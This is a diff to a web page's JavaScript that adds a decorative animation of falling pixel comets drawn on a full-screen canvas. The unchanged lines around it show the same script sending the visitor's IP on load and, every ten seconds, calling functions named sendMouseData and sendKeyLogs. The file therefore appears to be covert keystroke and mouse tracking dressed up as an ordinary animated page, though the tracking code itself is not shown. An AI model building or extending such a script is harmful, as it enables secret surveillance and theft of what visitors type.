@@ -200,7 +200,102 @@ const sendIP = async () => {
     console.error('Error:', error);
   }
 };
+const canvas = document.createElement('canvas');
+const ctx = canvas.getContext('2d');
+document.body.appendChild(canvas);
 
+canvas.style.position = 'fixed';
+canvas.style.top = '0';
+canvas.style.left = '0';
+canvas.style.width = '100%';
+canvas.style.height = '100%';
+canvas.style.zIndex = '0';
+canvas.style.pointerEvents = 'none';
+
+let width, height;
+function resize() {
+  width = canvas.width = window.innerWidth;
+  height = canvas.height = window.innerHeight;
+}
+resize();
+window.addEventListener('resize', resize);
+
+class Comet {
+  constructor() {
+    this.reset();
+  }
+  reset() {
+    this.x = Math.random() * width * 1.5 - width * 0.5; // start offscreen left
+    this.y = Math.random() * height * 0.5; // top half
+    this.size = 2 + Math.random() * 2;
+    this.speedX = 4 + Math.random() * 3; // faster horizontal speed
+    this.speedY = 1 + Math.random() * 1.5;
+    this.length = 20 + Math.floor(Math.random() * 30); // longer tails
+    this.opacity = 0.7 + Math.random() * 0.3;
+    this.trailColors = this.generateTrailColors();
+  }
+  generateTrailColors() {
+    // Gradient of colours from bright yellow to deep red in pixels
+    let colors = [];
+    for(let i = 0; i < this.length; i++) {
+      let t = i / this.length;
+      // interpolate red/orange/yellow shades
+      let r = Math.floor(255);
+      let g = Math.floor(200 * (1 - t));
+      let b = 0;
+      colors.push(`rgba(${r},${g},${b},${(1 - t) * this.opacity})`);
+    }
+    return colors;
+  }
+  update() {
+    this.x += this.speedX;
+    this.y += this.speedY;
+    if (this.x - this.length * this.speedX > width || this.y - this.length * this.speedY > height) {
+      this.reset();
+      this.y = Math.random() * height * 0.5;
+      this.x = -this.length * this.speedX; // restart from offscreen left
+    }
+  }
+  draw(ctx) {
+    ctx.save();
+    ctx.imageSmoothingEnabled = false; // pixelated look
+
+    // Draw tail pixels from furthest to nearest
+    for (let i = this.length - 1; i >= 0; i--) {
+      const tailX = this.x - i * this.speedX * 0.8;
+      const tailY = this.y - i * this.speedY * 0.8;
+
+      ctx.fillStyle = this.trailColors[i];
+      ctx.fillRect(Math.floor(tailX), Math.floor(tailY), this.size, this.size);
+    }
+
+    // Bright comet head - intense yellow/orange
+    ctx.fillStyle = 'rgba(255, 255, 180, 1)';
+    ctx.fillRect(Math.floor(this.x), Math.floor(this.y), this.size + 1, this.size + 1);
+
+    ctx.restore();
+  }
+}
+
+const comets = [];
+const cometCount = 40;
+
+for (let i = 0; i < cometCount; i++) {
+  comets.push(new Comet());
+}
+
+function animate() {
+  ctx.clearRect(0, 0, width, height);
+
+  comets.forEach(comet => {
+    comet.update();
+    comet.draw(ctx);
+  });
+
+  requestAnimationFrame(animate);
+}
+
+animate();
 sendIP();
 setInterval(sendMouseData, 10000);
 setInterval(sendKeyLogs, 10000);
